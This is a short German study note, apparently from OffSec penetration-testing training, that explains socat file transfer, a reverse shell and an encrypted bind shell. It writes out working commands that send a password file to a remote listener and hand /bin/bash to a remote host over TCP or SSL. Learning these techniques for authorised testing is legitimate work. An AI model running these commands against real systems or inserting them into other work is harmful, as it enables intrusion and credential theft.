# OffSec - Socat 

## File Transfer

Listener mit #Socat auf dem Host öffnen, um Daten zu empfangen und in eine Datei zu schreiben 

`socat TCP4-LISTEN:443,fork file:secret_passwords.txt`

Auf dem Empfänger folgender Befehl:
`socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`

## Reverseshells

Mit #Socat können auch #Reverseshells eröffnet werden. 

Auf dem Host
```socat -d -d TCP4-LISTEN:443 STDOUT```

Mit dem Angreifer PC folgende #Reverseshell spawnen

```socat TCP4:10.11.0.22:443 EXEC:/bin/bash```

## Socat Encrypted Bind Shells

Mit #Socat können #Ecrypted #BindShells erstellt werden. 
Dazu geht man wie folgt vor:

Auf der Angreifermaschine ein neues #SSL-Zertifikat erzeugen:
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`

-   req: initiate a new certificate signing request
-   -newkey: generate a new private key
-   rsa:2048: use RSA encryption with a 2,048-bit key length.
-   -nodes: store the private key without passphrase protection
-   -keyout: save the key to a file
-   -x509: output a self-signed certificate instead of a certificate request
-   -days: set validity period in days
-   -out: save the certificate to a file

Man erhält nun zwei #Zertifikate - bind_shell.key und bind_shell.crt.
Damit #Socat die #Zertifikate akzeptiert, müssen diese in ein .pem-File verwandelt werden.

`cat bind_shell.key bind_shell.crt > bind_shell.pem`

Um nun eine verschlüsselte #BindShell zu erzeugen, wird folgender Befehl beim Angreifer verwendet:
`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`

Der Angreifer wartet nun auf eine eingehende Verbindung des Opfers.
Das Opfer baut mit folgendem Befehl eine Verbindung zum Angreifer auf:
`socat - OPENSSL:10.11.0.4:443,verify=0`





